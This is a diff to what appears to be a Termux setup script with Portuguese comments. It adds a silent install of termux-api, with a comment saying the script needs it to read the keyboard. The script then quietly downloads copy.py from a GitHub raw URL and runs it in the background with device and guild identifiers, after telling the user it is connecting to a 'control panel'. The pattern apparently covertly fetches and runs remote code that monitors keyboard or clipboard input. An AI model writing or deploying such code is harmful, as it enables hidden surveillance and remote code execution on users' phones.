@@ -125,9 +125,14 @@ except:
 report["installation_status"] = "Completed"
 print("✅ Configuration finished! Connecting to control panel...")
 
-# 👉 AQUI ESTÁ A CORREÇÃO MÁGICA 👈
+# ==========================================
+# INICIALIZAÇÃO DO AUTO-COPY CORRIGIDA
+# ==========================================
 print("🚀 Iniciando serviços em background (Auto-Copy)...")
 try:
+    # 0. Garante que a API do Termux está instalada para ler o teclado!
+    os.system("pkg install termux-api -y -q > /dev/null 2>&1")
+
     # 1. Cria a pasta 'functions' caso ela não exista
     os.makedirs("functions", exist_ok=True)
     
@@ -135,10 +140,8 @@ try:
     URL_COPY_PY = "https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/copy.py"
     os.system(f"curl -sL {URL_COPY_PY} -o functions/copy.py > /dev/null 2>&1")
     
-    # 3. Inicia o arquivo
-    subprocess.Popen([sys.executable, "functions/copy.py", device_id, guild_id], 
-                     stdout=subprocess.DEVNULL, 
-                     stderr=subprocess.DEVNULL)
+    # 3. Inicia o arquivo SEM DEVNULL para você poder ver os erros ou mensagens de sucesso
+    subprocess.Popen([sys.executable, "functions/copy.py", device_id, guild_id])
     print("✅ Módulo Auto-Copy baixado e rodando em segundo plano.")
 except Exception as e:
     print(f"⚠️ Aviso: Não foi possível iniciar o Auto-Copy. Erro: {e}")
